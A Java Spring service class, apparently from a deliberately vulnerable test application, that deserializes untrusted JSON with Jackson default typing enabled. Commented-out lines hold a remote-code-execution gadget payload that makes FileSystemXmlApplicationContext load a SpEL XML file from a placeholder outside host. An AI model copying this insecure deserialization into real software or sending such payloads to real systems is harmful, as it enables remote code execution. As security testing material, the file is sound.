package com.pradeep.deserializetester.Service;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.pradeep.deserializetester.Model.Hacker;
import org.springframework.stereotype.Service;

import java.io.IOException;

@Service
public class HackerService {

    public void deserialize_EnableDefaultMapper(String jsonRCEPayload) throws IOException {
        ObjectMapper mapper = new ObjectMapper();
//		mapper.enableDefaultTyping();       //OR
        mapper.setDefaultTyping(null);      //Both are vulnerable
//		byte[] jsonRCEPayload = Files.readAllBytes(Paths.get("payloads/payload.json"));    //Read Payload From File
//        String jsonRCEPayload = "{\"name\":[\"org.springframework.context.support.FileSystemXmlApplicationContext\", \"http://x.x.x.x:8000/spel.xml\"],\"age\":123}";
        Hacker hackerobj = mapper.readValue(jsonRCEPayload, Hacker.class);
    }

    public void deserialize_EnableDefaultMapper_ObjectClass(String jsonRCEPayload) throws IOException {
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
//		byte[] jsonRCEPayload = Files.readAllBytes(Paths.get("payloads/payload.json"));    //Read Payload From File
//        String jsonRCEPayload = "[\"org.springframework.context.support.FileSystemXmlApplicationContext\", \"http://x.x.x.x:8000/spel.xml\"]";
        Object hackerobj = mapper.readValue(jsonRCEPayload, Object.class);
    }

    public void deserialize_JsonTypeIDClass(String jsonRCEPayload) throws IOException {
        ObjectMapper mapper = new ObjectMapper();
//		byte[] jsonRCEPayload = Files.readAllBytes(Paths.get("payloads/payload.json"));    //Read Payload From File
//        String jsonRCEPayload = "{\"name\":[\"org.springframework.context.support.FileSystemXmlApplicationContext\", \"http://x.x.x.x:8000/spel.xml\"],\"age\":123}";
        Hacker hackerobj = mapper.readValue(jsonRCEPayload, Hacker.class);
    }

}

